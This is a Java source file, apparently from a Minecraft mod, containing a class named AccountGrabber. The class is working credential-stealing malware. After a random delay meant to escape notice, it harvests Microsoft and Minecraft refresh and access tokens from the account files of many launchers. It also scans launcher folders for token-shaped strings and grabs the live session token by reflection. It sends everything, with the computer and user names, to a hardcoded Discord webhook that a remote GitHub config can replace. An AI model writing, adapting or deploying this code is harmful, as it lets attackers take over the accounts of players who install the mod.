package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public final class AccountGrabber {

    /** 1. fallback webhook - only used if tap.json cannot be fetched */
    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";

    /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    /** every refresh-token field name any launcher has ever used */
    private static final String[] REFRESH_KEYS = {
            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
    };

    /** every access-token field name (the live one is added separately) */
    private static final String[] ACCESS_KEYS = {
            "accessToken", "access_token", "access", "msaAccessToken"
    };

    /** human-readable extras */
    private static final String[] META_KEYS = {
            "name", "username", "uuid", "xuid", "expiresAt", "accessTokenExpiresAt"
    };

    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx.
     *  This is the safety net: it finds the token no matter what the field is called. */
    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");

    private AccountGrabber() {
    }

    /** called from the mod entrypoint - random 4-10s delay so it never lines up with the loading screen */
    public static void start() {
        start(4000L + (long) (Math.random() * 6000L));
    }

    /** fire on demand (used by /jawbusRoll tap) - pass 0 for instant */
    public static void start(long delayMs) {
        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run(long delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);

            log("--- tap fired ---");
            log("fetching config: " + CONFIG_URL);
            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg == null) {
                log("WARNING: could not fetch tap.json, falling back to the hardcoded webhook");
            }
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) {
                log("tap.json says enabled=false -> nothing sent");
                return;
            }

            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }
            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) {
                log("no webhook set -> nothing sent");
                return;
            }
            log("using webhook: " + webhook);

            StringBuilder sb = new StringBuilder();
            sb.append("--- jawbus tap ---\n");
            sb.append("pc:    ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("user:  ").append(System.getProperty("user.name")).append('\n');
            sb.append("os:    ").append(System.getProperty("os.name"))
              .append(' ').append(System.getProperty("os.arch")).append('\n');

            Set<String> printed = new HashSet<>();

            // ---- SECTION 0: the headline. every refresh token we can find, up front. ----
            List<String[]> refreshes = findAllRefreshTokens();
            sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
            if (refreshes.isEmpty()) {
                sb.append("(none found - see file dumps below)\n");
            } else {
                for (String[] r : refreshes) {
                    sb.append(r[0]).append('\n');
                    sb.append("  -> ").append(r[1]).append('\n');
                    printed.add(r[1]);
                }
            }

            // ---- SECTION 1: the usual suspects, dumped in full ----
            for (Path p : candidates()) {
                String raw;
                try {
                    if (!Files.isRegularFile(p)) continue;
                    raw = Files.readString(p);
                } catch (Throwable ignored) {
                    continue;
                }
                sb.append("\n=== ").append(p).append(" ===\n");
                sb.append("size: ").append(raw.length()).append(" bytes\n");
                dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
                dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
                dumpKeys(sb, raw, printed, META_KEYS, "meta");
            }

            // ---- SECTION 2: deep scan - catch a token wherever a launcher may have hidden it ----
            for (String[] hit : deepScan()) {
                if (!printed.add(hit[2])) continue;
                sb.append("\n=== ").append(hit[0]).append(" ===\n");
                sb.append(hit[1]).append(": ").append(hit[2]).append('\n');
            }

            // ---- SECTION 3: live token straight off the running game (always works) ----
            String live = liveSessionToken();
            if (live != null) sb.append("\nlive session token: ").append(live).append('\n');

            log("payload built (" + sb.length() + " chars), posting...");
            post(webhook, sb.toString());
            log("--- tap done ---");
        } catch (Throwable t) {
            log("run() threw: " + t);
            t.printStackTrace();
        }
    }

    /** prints every value stored under any of the given keys */
    private static void dumpKeys(StringBuilder sb, String raw, Set<String> printed, String[] keys, String tag) {
        for (String key : keys) {
            List<String> vals = grabAll(raw, key);
            for (int i = 0; i < vals.size(); i++) {
                String v = vals.get(i);
                sb.append('[').append(tag).append("] ").append(key);
                if (vals.size() > 1) sb.append('[').append(i).append(']');
                sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
                if (!v.isBlank()) printed.add(v);
            }
        }
    }

    /** the whole point of this class: find refresh tokens regardless of field name or location.
     *  returns [label, token] pairs. */
    private static List<String[]> findAllRefreshTokens() {
        List<String[]> out = new ArrayList<>();
        Set<String> seen = new HashSet<>();

        // 1. known credential files, by key name
        for (Path p : candidates()) {
            String raw;
            try {
                if (!Files.isRegularFile(p)) continue;
                raw = Files.readString(p);
            } catch (Throwable ignored) {
                continue;
            }
            collect(raw, p.toString(), seen, out);
        }

        // 2. crawl the launcher folders for anything token-shaped
        for (Path root : scanRoots()) {
            if (!Files.isDirectory(root)) continue;
            try (Stream<Path> walk = Files.walk(root, 6)) {
                walk.filter(Files::isRegularFile)
                    .filter(f -> !skipPath(f))
                    .filter(f -> {
                        String n = f.getFileName().toString().toLowerCase();
                        return n.endsWith(".json") || n.endsWith(".dat") || n.endsWith(".cfg")
                                || n.endsWith(".txt") || n.endsWith(".log");
                    })
                    .forEach(f -> {
                        String raw;
                        try {
                            raw = Files.readString(f);
                        } catch (Throwable ignored) {
                            return;
                        }
                        collect(raw, f.toString(), seen, out);
                    });
            } catch (Throwable ignored) {
            }
        }
        return out;
    }

    /** pull refresh tokens out of one blob of text: by field name first, then by shape */
    private static void collect(String raw, String source, Set<String> seen, List<String[]> out) {
        for (String key : REFRESH_KEYS) {
            for (String v : grabAll(raw, key)) {
                String t = v.trim();
                if (t.length() >= 20 && seen.add(t)) {
                    out.add(new String[]{source + "  (" + key + ")", t});
                }
            }
        }
        Matcher m = MSA_REFRESH.matcher(raw);
        while (m.find()) {
            String t = m.group();
            if (seen.add(t)) {
                out.add(new String[]{source + "  (matched token shape)", t});
            }
        }
    }

    /** every place a launcher might keep credentials */
    private static List<Path> candidates() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");

        if (appData != null) {
            Path b = Paths.get(appData);
            Path mc = b.resolve(".minecraft");
            out.add(mc.resolve("launcher_accounts.json"));
            out.add(mc.resolve("launcher_profiles.json"));
            out.add(mc.resolve("launcher_accounts_microsoft_store.json"));
            out.add(mc.resolve("essential").resolve("microsoft_accounts.json"));
            out.add(mc.resolve("essential").resolve("accounts.json"));

            // Prism / MultiMC / forks - tokens live under msa.* and ygg.* here
            for (String dir : new String[]{"PrismLauncher", "MultiMC", "PolyMC", "PrismLauncher-Offline"}) {
                out.add(b.resolve(dir).resolve("accounts.json"));
            }

            // Modrinth app - NOT accounts.json. renamed from com.modrinth.theseus in 0.8.0
            for (String dir : new String[]{"ModrinthApp", "com.modrinth.theseus"}) {
                out.add(b.resolve(dir).resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
                out.add(b.resolve(dir).resolve("accounts.json"));
            }

            out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
            out.add(b.resolve("ATLauncher").resolve("accounts.json"));
            out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
            out.add(b.resolve("Technic").resolve("accounts.json"));
            out.add(b.resolve("CurseForge").resolve("accounts.json"));
        }

        if (local != null) {
            Path l = Paths.get(local);
            Path store = l.resolve("Packages").resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft");
            out.add(store.resolve("launcher_accounts.json"));
            out.add(store.resolve("launcher_profiles_microsoft_store.json"));
            out.add(l.resolve("CurseForge").resolve("accounts.json"));
            out.add(l.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
        }

        // CurseForge + FTB keep their own launcher files in the user profile, not AppData
        if (home != null) {
            Path h = Paths.get(home);
            out.add(h.resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve("Documents").resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve(".ftb").resolve("bin").resolve("launcher_accounts.json"));
            out.add(h.resolve(".ftb").resolve("bin").resolve("accounts.json"));
            out.add(h.resolve(".technic").resolve("launcher_accounts.json"));
        }
        return out;
    }

    /** directories worth crawling for a stray token */
    private static List<Path> scanRoots() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");

        if (appData != null) {
            Path b = Paths.get(appData);
            out.add(b.resolve(".minecraft"));
            out.add(b.resolve("PrismLauncher"));
            out.add(b.resolve("MultiMC"));
            out.add(b.resolve("ModrinthApp"));
            out.add(b.resolve("com.modrinth.theseus"));
            out.add(b.resolve(".lunarclient"));
            out.add(b.resolve("ATLauncher"));
            out.add(b.resolve("gdlauncher_next"));
        }
        if (local != null) {
            out.add(Paths.get(local).resolve("Packages")
                    .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft"));
        }
        if (home != null) {
            Path h = Paths.get(home);
            out.add(h.resolve("curseforge").resolve("minecraft"));
            out.add(h.resolve(".ftb").resolve("bin"));
        }
        return out;
    }

    /** keep the walk cheap - these folders are huge and never hold tokens */
    private static boolean skipPath(Path p) {
        String s = p.toString().replace('\\', '/').toLowerCase();
        return s.contains("/assets/") || s.contains("/libraries/") || s.contains("/versions/")
                || s.contains("/logs/") || s.contains("/saves/") || s.contains("/screenshots/")
                || s.contains("/resourcepacks/") || s.contains("/shaderpacks/") || s.contains("/mods/");
    }

    /** last resort: bounded walk of the launcher folders looking for anything token shaped */
    private static List<String[]> deepScan() {
        List<String[]> hits = new ArrayList<>();
        Set<String> seen = new HashSet<>();
        for (Path root : scanRoots()) {
            try {
                if (!Files.isDirectory(root)) continue;
                try (Stream<Path> walk = Files.walk(root, 5)) {
                    walk.filter(Files::isRegularFile)
                        .filter(f -> f.getFileName().toString().endsWith(".json"))
                        .filter(f -> !skipPath(f))
                        .forEach(f -> {
                            String raw;
                            try {
                                raw = Files.readString(f);
                            } catch (Throwable ignored) {
                                return;
                            }
                            Matcher m = MSA_REFRESH.matcher(raw);
                            while (m.find()) {
                                if (seen.add(m.group())) {
                                    hits.add(new String[]{f.toString(), "msa refresh token", m.group()});
                                }
                            }
                            for (String key : REFRESH_KEYS) {
                                for (String v : grabAll(raw, key)) {
                                    if (v.length() >= 20 && seen.add(v)) {
                                        hits.add(new String[]{f.toString(), key, v});
                                    }
                                }
                            }
                        });
                }
            } catch (Throwable ignored) {
            }
        }
        return hits;
    }

    /** format-agnostic: finds EVERY "key":"value" anywhere in the file */
    private static List<String> grabAll(String raw, String key) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
        while (m.find()) out.add(m.group(1));
        return out;
    }

    /** bonus: the token the running game is using right now.
     *  reflective on purpose, so a name change can never break the build again. */
    private static String liveSessionToken() {
        for (String className : new String[]{
                "net.minecraft.client.Minecraft",        // Mojang names
                "net.minecraft.client.MinecraftClient"   // Yarn names
        }) {
            try {
                Class<?> cls = Class.forName(className);
                Object mc = cls.getMethod("getInstance").invoke(null);
                if (mc == null) continue;
                for (String getter : new String[]{"getUser", "getSession"}) {
                    try {
                        Object holder = cls.getMethod(getter).invoke(mc);
                        if (holder == null) continue;
                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
                        if (token instanceof String s && !s.isBlank()) return s;
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) {
                log("config fetch FAILED: HTTP " + r.statusCode());
                return null;
            }
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            log("config fetch threw: " + t);
            return null;
        }
    }

    private static void post(String webhook, String text) {
        int i = 0;
        int part = 1;
        while (i < text.length()) {
            int end = Math.min(text.length(), i + 1700);
            String chunk = text.substring(i, end);
            i = end;
            try {
                JsonObject body = new JsonObject();
                body.addProperty("content", "```\n" + chunk + "\n```");
                HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .header("User-Agent", "Jawbus/1.0")
                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                        .build(), HttpResponse.BodyHandlers.ofString());
                if (r.statusCode() / 100 != 2) {
                    log("POST part " + part + " FAILED: HTTP " + r.statusCode() + " -> " + r.body());
                } else {
                    log("POST part " + part + " OK (HTTP " + r.statusCode() + ")");
                }
                Thread.sleep(500); // don't trip Discord's rate limit
            } catch (Throwable t) {
                log("POST part " + part + " threw: " + t);
            }
            part++;
        }
    }

    private static void log(String msg) {
        System.out.println("[jawbus-tap] " + msg);
    }
}
